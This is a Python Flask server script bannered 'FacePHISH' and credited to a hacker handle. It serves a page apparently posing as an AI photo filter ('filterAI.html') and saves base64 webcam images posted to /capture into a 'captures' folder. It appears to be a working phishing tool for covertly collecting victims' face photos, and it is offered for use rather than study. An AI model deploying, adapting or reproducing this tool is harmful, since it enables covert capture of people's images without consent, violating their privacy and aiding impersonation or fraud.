from flask import Flask, render_template, request
import base64
import os
from datetime import datetime

app = Flask(__name__)
app.config['IMAGE_FOLDER'] = 'captures'

logo = '''
______            ______ _   _ _____ _____ _   _ 
|  ___|           | ___ \ | | |_   _/  ___| | | |
| |_ __ _  ___ ___| |_/ / |_| | | | \ `--.| |_| |
|  _/ _` |/ __/ _ \  __/|  _  | | |  `--. \  _  |
| || (_| | (_|  __/ |   | | | |_| |_/\__/ / | | |
\_| \__,_|\___\___\_|   \_| |_/\___/\____/\_| |_/

         ᴄʀᴇᴀᴛᴇᴅ ʙʏ @ʟᴀᴢʏ_ʜ4ᴄᴋꜱ
         
'''

print(logo)

@app.route('/')
def index():
    return render_template('filterAI.html')

@app.route('/capture', methods=['POST'])
def capture():
    image_data = request.form['imageData']
    save_image(image_data)
    return 'Image captured successfully!'

def save_image(image_data):
    image_data = image_data.split(',')[1]
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    filename = f"captured_image_{timestamp}.png"
    file_path = os.path.join(app.config['IMAGE_FOLDER'], filename)
    with open(file_path, 'wb') as image_file:
        image_file.write(base64.b64decode(image_data))

if __name__ == '__main__':
    os.makedirs(app.config['IMAGE_FOLDER'], exist_ok=True)
    app.run(host="localhost", port=80)
